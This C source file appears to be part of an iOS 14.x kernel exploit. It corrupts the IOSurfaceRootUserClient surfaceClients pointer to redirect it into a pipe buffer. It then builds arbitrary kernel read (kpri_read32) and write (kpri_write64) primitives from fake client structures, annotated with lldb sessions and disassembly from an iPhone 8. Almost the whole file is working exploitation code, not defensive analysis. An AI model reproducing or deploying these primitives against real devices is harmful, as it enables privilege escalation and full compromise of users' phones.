#include <stdio.h>
#include <stdint.h>
#include "kprimitive.h"
#include "main.h"
#include "IOSurfaceRoot.h"
#include "offsets.h"
#include "krw.h"
#include "kutils.h"
#include "find_port.h"

extern io_connect_t IOSurfaceRootUserClient;
extern uint64_t IOSurfaceRootUserClient_addr;

extern int *pipefds;
extern uint8_t *pipe_buffer;

extern size_t pipe_buffer_size;

uint64_t pipe_base = 0;

void read_pipe()
{
	// read - bsd/kern/sys_generic.c:201
	// fo_read - bsd/kern/kern_descrip.c:5572
	// pipe_read - bsd/kern/sys_pipe.c:740

    // printf("pipe_buffer 1 = %s\n", pipe_buffer);
    size_t read_size = pipe_buffer_size - 1;
    read(pipefds[0], pipe_buffer, read_size);
    // printf("pipe_buffer 2 = %s\n", pipe_buffer);
}

void write_pipe()
{
    // pipe_write - bsd/kern/sys_pipe.c:901
    // printf("write_pipe buf = %s\n", pipe_buffer);
    size_t write_size = pipe_buffer_size - 1;
    int write_ret = write(pipefds[1], pipe_buffer, write_size);
    printf("write_ret = %d\n", write_ret);
}

uint64_t surfaceClients = 0;
uint64_t rpipe = 0;
uint64_t wpipe = 0;
void build_stable_kmem_api()
{
    uint64_t p_fd = kread64(proc_of_pid(getpid()) + off_p_pfd); 
    uint64_t fd_ofiles = kread64(p_fd); 
    printf("pipefds[0] = %d\n", pipefds[0]);
    uint64_t rpipe_fp = kread64(fd_ofiles + pipefds[0] * 8);
    uint64_t r_fp_glob = kread64(rpipe_fp + off_fp_fglob);
    rpipe = kread64(r_fp_glob + off_fg_data); 
    uint64_t wpipe_fp = kread64(fd_ofiles + pipefds[1] * 8);
    uint64_t w_fp_glob = kread64(wpipe_fp + off_fp_fglob);
    wpipe = kread64(w_fp_glob + off_fg_data); 
    printf("rpipe = 0x%llx, wpipe = 0x%llx\n", rpipe, wpipe);
    
    uint32_t rpipe_cnt = kread32(rpipe + off_pb_cnt);
    uint32_t wpipe_cnt = kread32(wpipe + off_pb_cnt);
    printf("rpipe_cnt = 0x%x, wpipe_cnt = 0x%x\n", rpipe_cnt, wpipe_cnt);

    pipe_base = kread64(rpipe + off_pb_buffer); //kapi_read_kptr(rpipe + OFFSET(pipe, buffer));
    printf("pipe_base = 0x%llx\n", pipe_base);

    //com.apple.iokit.IOSurface:__text:FFFFFFF008427630                         ; __int64 __fastcall IOSurfaceRootUserClient::release_surface(__int64, unsigned int)
    //com.apple.iokit.IOSurface:__text:FFFFFFF008427630                         __ZN23IOSurfaceRootUserClient15release_surfaceEj
    //...
    //com.apple.iokit.IOSurface:__text:FFFFFFF008427660 68 8E 40 F9                             LDR             X8, [X19,#0x118] ; x8 = surfaceClient
	// OFFSET(IOSurfaceRootUserClient, surfaceClients) = 0x118;

    // (lldb) c
    // error: Process is running.  Use 'process interrupt' to pause execution.
    // Process 1 stopped

    // breakpoint set at...
    // com.apple.iokit.IOSurface:__text:FFFFFFF008428114                         ; __int64 __fastcall IOSurfaceRootUserClient::get_ycbcrmatrix(__int64, unsigned int, _DWORD *)
    // 0xFFFFFFF008428114 + 0x40
    //
    // * thread #1, stop reason = breakpoint 5.1
    //     frame #0: 0xfffffff013f48154
    //     0xfffffff013f48150: ldr    x8, [x19, #0x118] (0xfffffff013f48150 = 0xFFFFFFF008428150(no kslide)) 
    // ->  0xfffffff013f48154: ldr    x0, [x8, w22, uxtw #3]
    //     0xfffffff013f48158: cbz    x0, 0xfffffff013f48168
    //     0xfffffff013f4815c: mov    x1, x21
    //     0xfffffff013f48160: bl     0xfffffff013f42500
    // Target 1: (kernelcache.iPhone10,1.18D70) stopped.
    // (lldb) reg read x8
    //       x8 = 0xffffffe4cda8a000
    // (lldb) x/gx 0xffffffe4cda8a000
    // 0xffffffe4cda8a000: 0x6570697065706970
    // (lldb) x/s 0xffffffe4cda8a000
    // 0xffffffe4cda8a000: "pipepipe\x10\xa0\xa8\xcd\xe4\xff\xff\xffpipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipeL?\xb2\x12\xf0\xff\xff\xffpipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepip"
    // 0xffffffe4cda8a000 = pipe_base

	surfaceClients = kread64(IOSurfaceRootUserClient_addr + 0x118);
	printf("surfaceClients = 0x%llx\n", surfaceClients);

	kwrite64(IOSurfaceRootUserClient_addr + 0x118, pipe_base);
}

void clean_stable_kmem_api()
{
    kwrite64(IOSurfaceRootUserClient_addr + 0x118, surfaceClients);
}

// iOS 14.x only
struct fake_client {
    uint64_t pad_00; // can not use IOSurface 0 now         //off=0x0
    uint64_t uc_obj;                                        //off=0x8 v
    uint8_t pad_10[0x40]; // start of IOSurfaceClient obj   //off=0x10
    uint64_t surf_obj;                                      //off=0x50 v
    uint8_t pad_58[0x360 - 0x58];                           //off=0x58
    uint64_t shared_RW;                                     //off=0x360
};

uint32_t kpri_read32(uint64_t where) {

    struct fake_client *p = (void *)pipe_buffer;

    //bp set in...
    //com.apple.iokit.IOSurface:__text:FFFFFFF008428114                         __ZN23IOSurfaceRootUserClient15get_ycbcrmatrixEjPj
    //0xFFFFFFF008428114+0x40 = 0xFFFFFFF008428154
    //
    // Process 1 stopped
    // * thread #2, stop reason = instruction step into
    //     frame #0: 0xfffffff0213cc154
    // ->  0xfffffff0213cc154: ldr    x0, [x8, w22, uxtw #3]
    //     0xfffffff0213cc158: cbz    x0, 0xfffffff0213cc168
    //     0xfffffff0213cc15c: mov    x1, x21
    //     0xfffffff0213cc160: bl     0xfffffff0213c6500
    // Target 1: (kernelcache.iPhone10,1.18D70) stopped.
    // (lldb) reg read x8
    //       x8 = 0xffffffe4cdca1000
    // (lldb) x/32gx 0xffffffe4cdca1000
    // 0xffffffe4cdca1000: 0x4443424144434241 0xffffffe4cdca1010 <- p->uc_obj = pipe_base + 0x10; offsetof(uc_obj, p) = 0x8;
    // 0xffffffe4cdca1010: 0x4443424144434241 0x4443424144434241
    // 0xffffffe4cdca1020: 0x4443424144434241 0x4443424144434241
    // 0xffffffe4cdca1030: 0x4443424144434241 0x4443424144434241
    // 0xffffffe4cdca1040: 0x4443424144434241 0x4443424144434241
    // 0xffffffe4cdca1050: 0xfffffff01ffa7f4c 0x4443424144434241 <- p->surf_obj = where - 0xb4; offsetof(surf_obj, p) = 0x50;
    // 0xffffffe4cdca1060: 0x4443424144434241 0x4443424144434241
    // 0xffffffe4cdca1070: 0x4443424144434241 0x4443424144434241

    // v7 = *(_QWORD *)(*(_QWORD *)(a1 + 0x118) + 8LL * a2);
    // *(_QWORD *)(a1 + 0x118) = pipe_base
    // a2 = 1, so ... + 8 * 1 = 8, meaning offsetof(uc_obj, p) = 0x8;
    p->uc_obj = pipe_base + 0x10;   //com.apple.iokit.IOSurface:__text:FFFFFFF008422510 00 20 40 F9                             LDR             p->surf_obj, [p->uc_obj,#0x40]

    // com.apple.iokit.IOSurface:__text:FFFFFFF00841FA60                         ; __int64 __fastcall sub_FFFFFFF00841FA60(__int64)
    // com.apple.iokit.IOSurface:__text:FFFFFFF00841FA60                         sub_FFFFFFF00841FA60                    ; CODE XREF: IOSurface::getYCbCrMatrix(void)+14↓p
    // com.apple.iokit.IOSurface:__text:FFFFFFF00841FA60 00 B4 40 B9                             LDR             W0, [X0,#0xB4]
    // com.apple.iokit.IOSurface:__text:FFFFFFF00841FA64 C0 03 5F D6                             RET

    // Process 1 stopped
    // * thread #1, stop reason = breakpoint 2.1
    //     frame #0: 0xfffffff0213c3a60
    // ->  0xfffffff0213c3a60: ldr    w0, [x0, #0xb4]
    //     0xfffffff0213c3a64: ret    
    //     0xfffffff0213c3a68: strb   w1, [x0, #0x1f8]
    //     0xfffffff0213c3a6c: ret    
    // Target 1: (kernelcache.iPhone10,1.18D70) stopped.
    // (lldb) reg read x0
    //       x0 = 0xfffffff01ffa7f4c
    // (lldb) p/x 0xfffffff01ffa7f4c+0xb4
    // (unsigned long) 0xfffffff01ffa8000
    // (lldb) x/gx 0xfffffff01ffa8000 <- KERNEL_BASE
    // 0xfffffff01ffa8000: 0x0100000cfeedfacf
    // (lldb) ni
    // ...
    // Target 1: (kernelcache.iPhone10,1.18D70) stopped.
    // (lldb) reg read w0
    //       w0 = 0xfeedfacf
    p->surf_obj = where - 0xb4;
    printf("p ptr = %p\n", p);  //p's ptr will be used by copyin's user_addr
    // printf("Going to call write_pipe, set breakpoint first and press any key.\n"); char ch; ch = getchar();

    //  p->uc_obj, p->surf_obj will updated by uiomove in pipe_write - bsd/kern/sys_pipe.c:1046
    // uio_move - bsd/kern/kern_subr.c:114
    // error = uiomove(&wpipe->pipe_buffer.buffer[wpipe->pipe_buffer.in], (int)segsize, uio);
    // error = uiomove(0xffffffe4cdb43000, 0x0000000000000fff, 0xffffffe80f40bc90)
    // error = uiomove(pipe_base, pipe_buffer_size - 1, 0xffffffe80f40bc90);
    //struct uio can be found in bsd/sys/uio_internal.h:141
    // struct uio {
    //     union iovecs    uio_iovs;               /* current iovec */
    //     int                             uio_iovcnt;             /* active iovecs */
    //     off_t                   uio_offset;
    //     enum uio_seg    uio_segflg;
    //     enum uio_rw     uio_rw;
    //     user_size_t     uio_resid_64;
    //     int                             uio_size;               /* size for use with kfree */
    //     int                             uio_max_iovs;   /* max number of iovecs this uio_t can hold */
    //     u_int32_t               uio_flags;
    // };

    // enum uio_rw { UIO_READ, UIO_WRITE };
/*
    bp set in 0xFFFFFFF007EA9C60 + kslide (which means first called uiomove64 in pipe_write / iphone 8, 14.4.2)

    Process 1 stopped
    * thread #1, stop reason = breakpoint 6.1
        frame #0: 0xfffffff014cd5c60
    ->  0xfffffff014cd5c60: bl     0xfffffff014cb2d94
        0xfffffff014cd5c64: mov    x25, x0
    (lldb) reg read x2
          x2 = 0xffffffe80f40bc90
    (lldb) x/32a $x2
    0xffffffe80f40bc90: 0xffffffe80f40bcc8      <- p/x offsetof(struct uio, uio_iovs)
    0xffffffe80f40bc98: 0x00000001 0x00000000   <- p/x offsetof(struct uio, uio_iovcnt), maybe dummy?
    0xffffffe80f40bca0: 0xffffffffffffffff      <- p/x offsetof(struct uio, uio_offset)
    0xffffffe80f40bca8: 0x00000008 0x00000001   <- p/x offsetof(struct uio, uio_segflg), 0x8=UIO_USERSPACE64 / p/x offsetof(struct uio, uio_rw), 0x1=UIO_WRITE
    0xffffffe80f40bcb0: 0x0000000000000fff      <- p/x offsetof(struct uio, uio_resid_64) 
    0xffffffe80f40bcb8: 0x00000048 0x00000001   <- p/x offsetof(struct uio, uio_size) / p/x offsetof(struct uio, uio_max_iovs)
    0xffffffe80f40bcc0: 0x0000000000000001      <- p/x offsetof(struct uio, uio_flags)
    ...
*/

    // will be called copyin from uiomove64; error = copyin(uio->uio_iovs.uiovp->iov_base, CAST_DOWN(caddr_t, cp), (size_t)acnt);
    // which is in bsd/kern/kern_subr.c:176

    // copyin - osfmk/arm64/copyio.c:222
    // int copyin(const user_addr_t user_addr, void *kernel_addr, vm_size_t nbytes);
    
/*
    bp set in FFFFFFF007E86EF4 + kslide (which means first called copyin in uiomove64 / iphone 8, 14.4.2)

    Process 1 stopped
    * thread #2, stop reason = breakpoint 10.1
        frame #0: 0xfffffff014cb2ef4
    ->  0xfffffff014cb2ef4: bl     _copyin
        0xfffffff014cb2ef8: cbz    w0, 0xfffffff014cb2fc8
        0xfffffff014cb2efc: b      0xfffffff014cb2fe4
        0xfffffff014cb2f00: cmp    x22, x23
    Target 1: (kernelcache.iPhone10,1.18D70) stopped.
    (lldb) reg read
    General Purpose Registers:
            x0 = 0x000000010500e400 <- user_addr
            x1 = 0xffffffe4cdb43000 <- pipe_base
            x2 = 0x0000000000000fff <- nbytes
*/
    write_pipe();

    //call stack:
    //com.apple.iokit.IOSurface:__text:FFFFFFF008428114                         ; __int64 __fastcall IOSurfaceRootUserClient::get_ycbcrmatrix(__int64, unsigned int, __int64)
    //...
    //__TEXT_EXEC:__text:FFFFFFF00803B3AC                         ; IOReturn __cdecl IOUserClient::externalMethod(IOUserClient *__hidden this, uint32_t selector, IOExternalMethodArguments *arguments, IOExternalMethodDispatch *dispatch, OSObject *target, void *reference)
    //__TEXT_EXEC:__text:FFFFFFF00803B590 00 01 3F D6                             BLR             X8
    //...
    //__TEXT_EXEC:__text:FFFFFFF008045020                         ; __int64 __fastcall is_io_connect_method(__int64, unsigned int, __int64, int, __int64, int, _DWORD *, unsigned __int64, __int64, _DWORD *, unsigned __int64, _DWORD *, _DWORD *, unsigned __int64 *, _DWORD *, __int64, unsigned __int64 *)
    //__TEXT_EXEC:__text:FFFFFFF008045360 00 01 3F D6                             BLR             X8
    //...
    //__TEXT_EXEC:__text:FFFFFFF007B45334                         ; __int64 __fastcall _Xio_connect_method(__int64 result, __int64)
    //__TEXT_EXEC:__text:FFFFFFF007B454C0 D8 FE 13 94                             BL              _is_io_connect_method
    //...
    //__TEXT_EXEC:__text:FFFFFFF007A58324                         _ipc_kobject_server                     ; CODE XREF: sub_FFFFFFF007A2C210+120↑p
    //__TEXT_EXEC:__text:FFFFFFF007A585E0 00 01 3F D6                             BLR             X8
    //...
    //__TEXT_EXEC:__text:FFFFFFF007A2C210                         ; __int64 __fastcall ipc_kmsg_send(__int64, __int64, __int64)
    //__TEXT_EXEC:__text:FFFFFFF007A2C330 FD AF 00 94                             BL              _ipc_kobject_server
    //...
    //__TEXT_EXEC:__text:FFFFFFF007A461BC                         _mach_msg_overwrite_trap                ; CODE XREF: sub_FFFFFFF007A465D4+4↓j
    //__TEXT_EXEC:__text:FFFFFFF007A462A4 DB 97 FF 97                             BL              _ipc_kmsg_send
    //...
    //__TEXT_EXEC:__text:FFFFFFF007B6B9BC                         ; __int64 __fastcall mach_syscall(_DWORD *)
    //__TEXT_EXEC:__text:FFFFFFF007B6BB2C C0 02 3F D6                             BLR             X22
    //...
    //__TEXT_EXEC:__text:FFFFFFF007B7702C                         ; __int64 __fastcall sleh_synchronous(__int64 result, unsigned __int64, const void *)
    //__TEXT_EXEC:__text:FFFFFFF007B77640 DF D0 FF 97                             BL              _mach_syscall
    //...
    //__TEXT_EXEC:__text:FFFFFFF0080AD5D4                         ; __int64 __fastcall fleh_synchronous(__int64)
    //__TEXT_EXEC:__text:FFFFFFF0080AD5F8 8D 26 EB 97                             BL              _sleh_synchronous

    printf("Going to call iosurface_s_get_ycbcrmatrix, set breakpoint first and press any key.\n"); char ch = getchar();
    
    uint32_t v = iosurface_s_get_ycbcrmatrix();

    //if we don't call read_pipe later, then pipe_base 0xffffffe4cdb43000 will be remained like below..?
    // Process 1 stopped
    // * thread #3, stop reason = instruction step into
    //     frame #0: 0xfffffff015254154
    // ->  0xfffffff015254154: ldr    x0, [x8, w22, uxtw #3]
        // 0xfffffff015254158: cbz    x0, 0xfffffff015254168
        // 0xfffffff01525415c: mov    x1, x21
        // 0xfffffff015254160: bl     0xfffffff01524e500
    // Target 1: (kernelcache.iPhone10,1.18D70) stopped.
    // (lldb) reg read x8
        //   x8 = 0xffffffe4cdb43000
    // (lldb) x/16gx 0xffffffe4cdb43000
    // 0xffffffe4cdb43000: 0x3f00113a0a15025c 0x0000000000000000
    // 0xffffffe4cdb43010: 0x0000000000000000 0x0000000000000000
    // ... weird!

    //

    // Cause why we need to called read_pipe:
    // bsd/kern/sys_pipe.c:957 from pipe_write
#if 0
/*
		 * need to do initial allocation or resizing of pipe
		 * holding both structure and io locks.
		 */
		if ((error = pipeio_lock(wpipe, 1)) == 0) {
			if (wpipe->pipe_buffer.cnt == 0) { <- YYY this checks
				error = pipespace(wpipe, pipe_size); 
			} else {
				error = expand_pipespace(wpipe, pipe_size); <- if not wpipe->pipe_buffer.cnt == 0, then expand allocation
			}

			pipeio_unlock(wpipe);

			/* allocation failed */
			if (wpipe->pipe_buffer.buffer == 0) {
				error = ENOMEM;
			}
		}

/*
 * expand the size of pipe while there is data to be read,
 * and then free the old buffer once the current buffered
 * data has been transferred to new storage.
 * Required: PIPE_LOCK and io lock to be held by caller.
 * returns 0 on success or no expansion possible
 */
static int
expand_pipespace(struct pipe *p, int target_size)
...
#endif 
    // if ever had called pipe_read from read_pipe, then cnt will be decreased, so no need to expand allocation
    // rpipe->pipe_buffer.cnt -= size; ( bsd/kern/sys_pipe.c:796 from pipe_read )
    read_pipe();

    printf("Going to end of call iosurface_s_get_ycbcrmatrix, set breakpoint first and press any key.\n");  ch = getchar();
    uint32_t rpipe_cnt = kread32(rpipe + off_pb_cnt);
    uint32_t wpipe_cnt = kread32(wpipe + off_pb_cnt);
    printf("[kpri_kread32] rpipe_cnt = 0x%x, wpipe_cnt = 0x%x\n", rpipe_cnt, wpipe_cnt);

    return v;
};

void kpri_write64(uint64_t where, uint64_t what) {
    struct fake_client *p = (void *)pipe_buffer;

    p->uc_obj = pipe_base + 0x10;
    p->surf_obj = pipe_base;

    // com.apple.iokit.IOSurface:__text:FFFFFFF0084218F8                         ; __int64 __fastcall IOSurface::setIndexedTimestamp(__int64, unsigned __int64, __int64)
    // com.apple.iokit.IOSurface:__text:FFFFFFF0084218F8                         __ZN9IOSurface19setIndexedTimestampEyy  ; CODE XREF: IOSurfaceRootUserClient::set_indexed_timestamp(uint,ulong long,ulong long)+5C↓p
    // com.apple.iokit.IOSurface:__text:FFFFFFF0084218F8 3F 0C 00 F1                             CMP             X1, #3
    // com.apple.iokit.IOSurface:__text:FFFFFFF0084218FC C8 00 00 54                             B.HI            loc_FFFFFFF008421914
    // com.apple.iokit.IOSurface:__text:FFFFFFF008421900 E8 03 00 AA                             MOV             X8, X0
    // com.apple.iokit.IOSurface:__text:FFFFFFF008421904 00 00 80 52                             MOV             W0, #0
    // com.apple.iokit.IOSurface:__text:FFFFFFF008421908 08 B1 41 F9                             LDR             X8, [X8,#0x360] <- XXX; p->shared_RW = where; X2 = what
    // com.apple.iokit.IOSurface:__text:FFFFFFF00842190C 02 79 21 F8                             STR             X2, [X8,X1,LSL#3] // *(_QWORD *)(*(_QWORD *)(a1 + 0x360) + 8 * a2) = a3;
    // com.apple.iokit.IOSurface:__text:FFFFFFF008421910 C0 03 5F D6                             RET
    // com.apple.iokit.IOSurface:__text:FFFFFFF008421914                         ; ---------------------------------------------------------------------------
    // com.apple.iokit.IOSurface:__text:FFFFFFF008421914
    // com.apple.iokit.IOSurface:__text:FFFFFFF008421914                         loc_FFFFFFF008421914                    ; CODE XREF: IOSurface::setIndexedTimestamp(ulong long,ulong long)+4↑j
    // com.apple.iokit.IOSurface:__text:FFFFFFF008421914 40 58 80 52 00 00 BC 72                 MOV             W0, #0xE00002C2
    // com.apple.iokit.IOSurface:__text:FFFFFFF00842191C C0 03 5F D6                             RET
    p->shared_RW = where;
    write_pipe();

    //com.apple.iokit.IOSurface:__text:FFFFFFF008426E44                         ; __int64 __fastcall IOSurfaceRootUserClient::s_set_indexed_timestamp(__int64, __int64, __int64)
    iosurface_s_set_indexed_timestamp(what);
    read_pipe();
};